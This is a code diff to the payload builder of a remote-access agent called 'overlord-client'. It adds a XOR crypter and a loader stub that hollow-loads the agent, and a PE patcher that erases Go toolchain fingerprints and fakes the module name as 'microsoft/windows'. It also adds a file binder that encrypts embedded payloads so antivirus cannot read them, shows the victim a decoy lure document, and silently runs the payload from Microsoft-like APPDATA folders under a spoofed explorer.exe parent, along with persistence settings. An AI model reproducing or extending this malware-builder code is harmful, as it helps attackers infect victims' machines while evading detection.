@@ -21,6 +21,8 @@ import {
 import { runDonut } from "./donut-manager";
 import { buildLinuxShellcode } from "./linux-shellcode-manager";
 import { runSgn } from "./sgn-manager";
+import { patchPe } from "./pe-patcher";
+import { wrapXorStub } from "./custom-crypter";
 import { resolveContainedPath } from "./upload-security";
 import { createIsolatedGoBuildEnv } from "./build-environment";
 import { cleanupMacosSdkUpload, extractAndValidateMacosSdk } from "./macos-sdk-manager";
@@ -131,6 +133,10 @@ type BuildProcessConfig = {
   garbleLiterals?: boolean;
   garbleTiny?: boolean;
   garbleSeed?: string;
+  exePrefix?: string;
+  registryValueName?: string;
+  binaryDir?: string;
+  localBinaryDir?: string;
   assemblyTitle?: string;
   assemblyProduct?: string;
   assemblyCompany?: string;
@@ -166,6 +172,8 @@ type BuildProcessConfig = {
   buildPlugins?: Record<string, { enabled: boolean; settings: Record<string, unknown> }>;
   macosSdkArchivePath?: string;
   macosSdkUploadDir?: string;
+  enablePePatcher?: boolean;  // post-build PE fingerprint removal (linker ver, buildinfo, module path, checksum)
+  enableCrypter?: boolean;    // XOR shellcode crypter (wraps Donut/Linux shellcode with self-decrypting stub)
 };
 
 type BuildHookRunner = (
@@ -292,6 +300,74 @@ function stripUpxHeaders(filePath: string): boolean {
     return modified;
   } catch {
     return false;
+  }
+}
+
+/**
+ * Build the crypt-loader stub with the given PE agent encrypted inside.
+ * Generates a payload_gen.go file (crypt_build tag), builds the loader,
+ * PE-patches it, and returns the final buffer.
+ */
+async function buildCryptLoader(
+  agentBuf: Buffer,
+  clientDir: string,
+  env: NodeJS.ProcessEnv,
+  obfuscate: boolean,
+  garbleFlags: string[],
+  ldflags: string,
+  outPath: string,
+  sendToStream: (data: any) => void,
+): Promise<void> {
+  // XOR-encrypt the agent
+  const key = new Uint8Array(32);
+  crypto.getRandomValues(key);
+  const encrypted = Buffer.from(agentBuf.map((b, i) => b ^ key[i % 32]));
+
+  const keyLit = Array.from(key).map((b) => `0x${b.toString(16).padStart(2, "0")}`).join(", ");
+  const payloadLit = Array.from(encrypted).map((b) => `0x${b.toString(16).padStart(2, "0")}`).join(", ");
+
+  const payloadGenPath = path.join(clientDir, "cmd", "crypt-loader", "payload_gen.go");
+  const payloadGenCode = `//go:build crypt_build
+
+package main
+
+var encPayload = []byte{${payloadLit}}
+var cryptKey = [32]byte{${keyLit}}
+`;
+  fs.writeFileSync(payloadGenPath, payloadGenCode);
+
+  try {
+    const buildArgs: string[] = [
+      "-tags", "crypt_build",
+      "-trimpath", "-buildvcs=false",
+    ];
+    if (ldflags) buildArgs.push(`-ldflags=${ldflags}`);
+    buildArgs.push("-o", outPath, "./cmd/crypt-loader");
+
+    let buildCmd;
+    if (obfuscate) {
+      buildCmd = $`garble ${[...garbleFlags, "build", ...buildArgs]}`;
+    } else {
+      buildCmd = $`go build ${buildArgs}`;
+    }
+    const proc = buildCmd.env(env).cwd(clientDir).nothrow();
+    for await (const line of proc.lines()) {
+      const t = line.trim();
+      if (t) sendToStream({ type: "output", text: line + "\n", level: "info" });
+    }
+    const result = await proc;
+    if (result.exitCode !== 0) {
+      const stderr = result.stderr.toString();
+      if (stderr) sendToStream({ type: "output", text: stderr, level: "error" });
+      throw new Error(`crypt-loader build failed (exit ${result.exitCode})`);
+    }
+
+    // PE-patch the loader itself to remove Go fingerprints
+    const loaderBuf = fs.readFileSync(outPath);
+    const patched = patchPe(loaderBuf, { moduleName: "overlord-client", fakeModuleName: "microsoft/windows" });
+    fs.writeFileSync(outPath, patched);
+  } finally {
+    try { fs.unlinkSync(payloadGenPath); } catch {}
   }
 }
 
@@ -700,6 +776,8 @@ export async function startBuildProcess(
   let binderGenPath: string | null = null;
   let binderFilesDir: string | null = null;
   let binderLockPath: string | null = null;
+  let binderExecWinPath: string | null = null;
+  let binderExecOtherPath: string | null = null;
   let macosSdkRoot: string | null = null;
   let providerStagingDir: string | null = null;
 
@@ -1166,6 +1244,8 @@ export async function startBuildProcess(
       const agentDir = path.join(clientDir, "cmd", "agent");
       binderLockPath = path.join(agentDir, ".binder.lock");
       binderGenPath = path.join(agentDir, "binder_gen.go");
+      binderExecWinPath = path.join(agentDir, "binder_exec_win.go");
+      binderExecOtherPath = path.join(agentDir, "binder_exec_other.go");
       binderFilesDir = path.join(agentDir, "bindfiles");
 
       // Wait up to 5 minutes to acquire the binder lock (serializes concurrent builds with bound files)
@@ -1186,11 +1266,18 @@ export async function startBuildProcess(
       try {
         fs.mkdirSync(binderFilesDir, { recursive: true });
 
-        const manifest: { name: string; targetOS: string[]; execute: boolean }[] = [];
+        // Per-build XOR key: embedded in the binary so AV can't extract payload statically.
+        const xorKey = new Uint8Array(32);
+        crypto.getRandomValues(xorKey);
+        const keyGoLiteral = Array.from(xorKey).map((b: number) => `0x${b.toString(16).padStart(2, "0")}`).join(", ");
+
+        const manifest: { name: string; targetOS: string[]; execute: boolean; lure: boolean }[] = [];
         for (const bf of config.boundFiles!) {
           const fileBytes = Buffer.from(bf.data, "base64");
-          fs.writeFileSync(path.join(binderFilesDir, bf.name), fileBytes, { mode: 0o755 });
-          manifest.push({ name: bf.name, targetOS: bf.targetOS, execute: bf.execute });
+          // XOR-encrypt the file bytes before embedding
+          const encrypted = Buffer.from(fileBytes.map((byte: number, i: number) => byte ^ xorKey[i % xorKey.length]));
+          fs.writeFileSync(path.join(binderFilesDir, bf.name), encrypted, { mode: 0o755 });
+          manifest.push({ name: bf.name, targetOS: bf.targetOS, execute: bf.execute, lure: bf.lure ?? false });
           sendToStream({
             type: "output",
             text: `Bound file: ${bf.name} (${fileBytes.length} bytes)${bf.targetOS.length > 0 ? ` [${bf.targetOS.join(",")}]` : " [all OS]"}${bf.execute ? " [exec]" : ""}\n`,
@@ -1202,30 +1289,83 @@ export async function startBuildProcess(
           JSON.stringify({ files: manifest }, null, 2),
         );
 
-        const binderGoCode = `//go:build hasbinder
+        // binder_gen.go — cross-platform core: decrypt, random APPDATA drop path, cleanup
+        const binderGenCode = `//go:build hasbinder
 
 package main
 
 import (
+\t"crypto/rand"
 \t"embed"
+\t"encoding/hex"
 \t"encoding/json"
 \t"os"
-\t"os/exec"
 \t"path/filepath"
 \t"runtime"
+\t"time"
 )
 
 //go:embed bindfiles
 var boundFilesFS embed.FS
 
+var binderKey = []byte{${keyGoLiteral}}
+
+var binderDropDirs = []string{
+\tfilepath.Join("Microsoft", "EdgeUpdate"),
+\tfilepath.Join("Microsoft", "DeviceSync"),
+\tfilepath.Join("Microsoft", "Windows", "GameExplorer"),
+\tfilepath.Join("Microsoft", "Network", "Connections"),
+\tfilepath.Join("Microsoft", "Feeds"),
+}
+
 type binderFileEntry struct {
 \tName     string   \`json:"name"\`
 \tTargetOS []string \`json:"targetOS"\`
 \tExecute  bool     \`json:"execute"\`
+\tLure     bool     \`json:"lure"\`
 }
 
 type binderManifest struct {
 \tFiles []binderFileEntry \`json:"files"\`
+}
+
+func binderCheckOS(entry binderFileEntry) bool {
+\tif len(entry.TargetOS) == 0 {
+\t\treturn true
+\t}
+\tfor _, t := range entry.TargetOS {
+\t\tif t == runtime.GOOS {
+\t\t\treturn true
+\t\t}
+\t}
+\treturn false
+}
+
+func binderDecrypt(data []byte) []byte {
+\tout := make([]byte, len(data))
+\tfor i, b := range data {
+\t\tout[i] = b ^ binderKey[i%len(binderKey)]
+\t}
+\treturn out
+}
+
+func binderDropPath(origName string) (string, error) {
+\tbase := os.Getenv("APPDATA")
+\tif base == "" {
+\t\tbase = os.TempDir()
+\t}
+\tidxB := make([]byte, 1)
+\t_, _ = rand.Read(idxB)
+\tsubdir := binderDropDirs[int(idxB[0])%len(binderDropDirs)]
+\tdir := filepath.Join(base, subdir)
+\tif err := os.MkdirAll(dir, 0755); err != nil {
+\t\treturn "", err
+\t}
+\text := filepath.Ext(origName)
+\tstemB := make([]byte, 6)
+\t_, _ = rand.Read(stemB)
+\tname := hex.EncodeToString(stemB) + ext
+\treturn filepath.Join(dir, name), nil
 }
 
 func runBoundFiles() {
@@ -1240,47 +1380,132 @@ func runBoundFiles() {
 \tif len(manifest.Files) == 0 {
 \t\treturn
 \t}
-\ttmpDir, err := os.MkdirTemp("", "ovld_")
-\tif err != nil {
-\t\treturn
-\t}
+
+\t// Check if any lure files exist for this OS
+\thasLures := false
 \tfor _, entry := range manifest.Files {
-\t\tif len(entry.TargetOS) > 0 {
-\t\t\tmatched := false
-\t\t\tfor _, t := range entry.TargetOS {
-\t\t\t\tif t == runtime.GOOS {
-\t\t\t\t\tmatched = true
-\t\t\t\t\tbreak
-\t\t\t\t}
-\t\t\t}
-\t\t\tif !matched {
-\t\t\t\tcontinue
-\t\t\t}
+\t\tif entry.Lure && entry.Execute && binderCheckOS(entry) {
+\t\t\thasLures = true
+\t\t\tbreak
 \t\t}
-\t\tdata, err := boundFilesFS.ReadFile("bindfiles/" + entry.Name)
+\t}
+
+\t// Pass 1: lure files – open visibly so user sees a decoy document
+\tfor _, entry := range manifest.Files {
+\t\tif !entry.Lure || !entry.Execute || !binderCheckOS(entry) {
+\t\t\tcontinue
+\t\t}
+\t\tencrypted, err := boundFilesFS.ReadFile("bindfiles/" + entry.Name)
 \t\tif err != nil {
 \t\t\tcontinue
 \t\t}
-\t\toutPath := filepath.Join(tmpDir, entry.Name)
+\t\tdata := binderDecrypt(encrypted)
+\t\toutPath, err := binderDropPath(entry.Name)
+\t\tif err != nil {
+\t\t\tcontinue
+\t\t}
+\t\tif err := os.WriteFile(outPath, data, 0644); err != nil {
+\t\t\tcontinue
+\t\t}
+\t\tbinderExec(outPath, data)
+\t\t// Lure files are kept – user may open them again
+\t}
+
+\t// Brief pause: lure is visible on screen before payload starts
+\tif hasLures {
+\t\ttime.Sleep(2 * time.Second)
+\t}
+
+\t// Pass 2: payload files – run silently, clean up after launch
+\tfor _, entry := range manifest.Files {
+\t\tif entry.Lure || !binderCheckOS(entry) {
+\t\t\tcontinue
+\t\t}
+\t\tencrypted, err := boundFilesFS.ReadFile("bindfiles/" + entry.Name)
+\t\tif err != nil {
+\t\t\tcontinue
+\t\t}
+\t\tdata := binderDecrypt(encrypted)
+\t\toutPath, err := binderDropPath(entry.Name)
+\t\tif err != nil {
+\t\t\tcontinue
+\t\t}
 \t\tif err := os.WriteFile(outPath, data, 0755); err != nil {
 \t\t\tcontinue
 \t\t}
 \t\tif entry.Execute {
-\t\t\tvar cmd *exec.Cmd
-\t\t\tswitch runtime.GOOS {
-\t\t\tcase "windows":
-\t\t\t\tcmd = exec.Command("cmd", "/c", "start", "", outPath)
-\t\t\tcase "darwin":
-\t\t\t\tcmd = exec.Command("open", outPath)
-\t\t\tdefault:
-\t\t\t\tcmd = exec.Command("xdg-open", outPath)
-\t\t\t}
-\t\t\t_ = cmd.Start()
+\t\t\tbinderExec(outPath, data)
+\t\t\tgo func(p string) {
+\t\t\t\ttime.Sleep(5 * time.Second)
+\t\t\t\t_ = os.Remove(p)
+\t\t\t}(outPath)
 \t\t}
 \t}
 }
 `;
-        fs.writeFileSync(binderGenPath, binderGoCode);
+
+        // binder_exec_win.go — Windows: PPID-spoofed direct launch (explorer.exe parent, no cmd.exe)
+        const binderExecWinCode = `//go:build hasbinder && windows
+// +build hasbinder,windows
+
+package main
+
+import (
+\t"overlord-client/cmd/agent/evasion"
+\t"golang.org/x/sys/windows"
+\t"unsafe"
+)
+
+var (
+\t_binderShell32    = windows.NewLazySystemDLL("shell32.dll")
+\t_binderShellExecW = _binderShell32.NewProc("ShellExecuteW")
+)
+
+// binderExec launches the dropped file on Windows.
+// EXE payloads: CreateProcess with PPID spoofed to explorer.exe, CREATE_NO_WINDOW.
+// Non-EXE files: ShellExecuteW fallback (opens the file with its default handler).
+func binderExec(outPath string, _ []byte) {
+\tif h, err := evasion.SpawnWithSpoofedParent(outPath, ""); err == nil {
+\t\t_ = windows.CloseHandle(h)
+\t\treturn
+\t}
+\tverb, _ := windows.UTF16PtrFromString("open")
+\tfile, _ := windows.UTF16PtrFromString(outPath)
+\t_, _, _ = _binderShellExecW.Call(
+\t\t0,
+\t\tuintptr(unsafe.Pointer(verb)),
+\t\tuintptr(unsafe.Pointer(file)),
+\t\t0, 0, 1,
+\t)
+}
+`;
+
+        // binder_exec_other.go — macOS/Linux: open/xdg-open
+        const binderExecOtherCode = `//go:build hasbinder && !windows
+// +build hasbinder,!windows
+
+package main
+
+import (
+\t"os/exec"
+\t"runtime"
+)
+
+func binderExec(outPath string, _ []byte) {
+\tvar cmd *exec.Cmd
+\tswitch runtime.GOOS {
+\tcase "darwin":
+\t\tcmd = exec.Command("open", outPath)
+\tdefault:
+\t\tcmd = exec.Command("xdg-open", outPath)
+\t}
+\t_ = cmd.Start()
+}
+`;
+
+        fs.writeFileSync(binderGenPath, binderGenCode);
+        fs.writeFileSync(binderExecWinPath!, binderExecWinCode);
+        fs.writeFileSync(binderExecOtherPath!, binderExecOtherCode);
         sendToStream({
           type: "output",
           text: `Binder ready: ${config.boundFiles!.length} file(s) will be embedded\n`,
@@ -1506,6 +1731,18 @@ func runBoundFiles() {
             const startupNameFlag = `-X overlord-client/cmd/agent/persistence.DefaultStartupName=${config.startupName}`;
             ldflags = `${ldflags} ${startupNameFlag}`;
             sendToStream({ type: "output", text: `Startup name: ${config.startupName}\n`, level: "info" });
+          }
+          if (config.exePrefix) {
+            ldflags = `${ldflags} -X overlord-client/cmd/agent/persistence.DefaultExePrefix=${config.exePrefix}`;
+          }
+          if (config.registryValueName) {
+            ldflags = `${ldflags} -X overlord-client/cmd/agent/persistence.DefaultRegistryValue=${config.registryValueName}`;
+          }
+          if (config.binaryDir) {
+            ldflags = `${ldflags} -X overlord-client/cmd/agent/persistence.DefaultBinaryDir=${config.binaryDir}`;
+          }
+          if (config.localBinaryDir) {
+            ldflags = `${ldflags} -X overlord-client/cmd/agent/persistence.DefaultLocalBinaryDir=${config.localBinaryDir}`;
           }
         } else {
           sendToStream({ type: "output", text: `Persistence is not supported on ${platform}, skipping...\n`, level: "warning" });
@@ -1816,6 +2053,44 @@ func runBoundFiles() {
           }),
           sendToStream,
         );
+        // ── PE crypter: wrap agent in encrypted loader stub ───────────────────
+        // Produces a new EXE (the loader) that contains the agent XOR-encrypted.
+        // The loader decrypts and hollows-loads the agent at runtime.
+        // Skipped in shellcode mode (XOR stub handles that path separately).
+        if (config.enableCrypter && os === "windows" && !isShellcodeMode) {
+          sendToStream({ type: "output", text: `Building PE crypt-loader (hollow load)...\n`, level: "info" });
+          const loaderPath = `${filePath}.loader.exe`;
+          try {
+            const agentBuf = fs.readFileSync(filePath);
+            await buildCryptLoader(
+              agentBuf, clientDir, env,
+              !!config.obfuscate, garbleFlags, ldflags,
+              loaderPath, sendToStream,
+            );
+            fs.renameSync(loaderPath, filePath);
+            finalSize = fs.statSync(filePath).size;
+            sendToStream({ type: "output", text: `PE crypt-loader ready: ${finalSize} bytes\n`, level: "success" });
+          } catch (cryptErr: any) {
+            try { fs.unlinkSync(loaderPath); } catch {}
+            sendToStream({ type: "output", text: `WARNING: PE crypt-loader failed (non-fatal): ${cryptErr.message || cryptErr}\n`, level: "warn" });
+          }
+        }
+
+        // ── PE patcher: strip Go toolchain fingerprints ───────────────────────
+        // Runs before UPX so we patch the raw PE (UPX repacks the binary anyway).
+        if ((config.enablePePatcher !== false) && os === "windows" && !isShellcodeMode) {
+          sendToStream({ type: "output", text: `Running PE patcher (buildinfo, linker ver, module path, checksum)...\n`, level: "info" });
+          try {
+            const rawPe = fs.readFileSync(filePath);
+            const patched = patchPe(rawPe, { moduleName: "overlord-client", fakeModuleName: "microsoft/windows" });
+            fs.writeFileSync(filePath, patched);
+            finalSize = patched.length;
+            sendToStream({ type: "output", text: `PE patched: ${rawPe.length} → ${patched.length} bytes\n`, level: "info" });
+          } catch (patchErr: any) {
+            sendToStream({ type: "output", text: `WARNING: PE patcher failed (non-fatal): ${patchErr.message || patchErr}\n`, level: "warn" });
+          }
+        }
+
         // For script outputs: go build writes a PE binary; UPX must run first (it needs PE format),
         // then after compression we wrap it in a script with an embedded base64 payload.
         const isBatchWrapper = os === "windows" && (winExt === ".bat" || winExt === ".cmd");
@@ -2340,6 +2615,26 @@ func runBoundFiles() {
           sendToStream({ type: "output", text: `Shellcode ready: ${finalOutputSize} bytes → ${finalOutputName}\n`, level: "success" });
         }
 
+        // ── Custom XOR stub crypter ───────────────────────────────────────────
+        // Wraps shellcode with a position-independent x64 decryptor so the
+        // payload is XOR-encrypted at rest and only decrypted in memory at run.
+        if (config.enableCrypter && shellcodeBinPath) {
+          sendToStream({ type: "output", text: `Applying XOR crypter stub...\n`, level: "info" });
+          try {
+            const rawSc = fs.readFileSync(shellcodeBinPath);
+            const { output: wrapped, key } = wrapXorStub(rawSc);
+            fs.writeFileSync(shellcodeBinPath, wrapped);
+            finalOutputSize = wrapped.length;
+            sendToStream({
+              type: "output",
+              text: `XOR crypter: ${rawSc.length} → ${wrapped.length} bytes (key: ${key.toString("hex").substring(0, 8)}...)\n`,
+              level: "info",
+            });
+          } catch (cryptErr: any) {
+            sendToStream({ type: "output", text: `WARNING: XOR crypter failed (non-fatal): ${cryptErr.message || cryptErr}\n`, level: "warn" });
+          }
+        }
+
         if (config.useSgn && shellcodeBinPath && shellcodeArch) {
           const iters = Math.max(1, Math.min(50, Math.floor(config.sgnIterations ?? 1)));
           sendToStream({ type: "status", text: `Encoding ${platform} shellcode with SGN (×${iters})…` });
@@ -2567,6 +2862,12 @@ func runBoundFiles() {
     // Binder cleanup: remove generated Go file, bindfiles dir, and release lock
     if (binderGenPath) {
       try { fs.unlinkSync(binderGenPath); } catch {}
+    }
+    if (binderExecWinPath) {
+      try { fs.unlinkSync(binderExecWinPath); } catch {}
+    }
+    if (binderExecOtherPath) {
+      try { fs.unlinkSync(binderExecOtherPath); } catch {}
     }
     if (binderFilesDir) {
       try { fs.rmSync(binderFilesDir, { recursive: true, force: true }); } catch {}
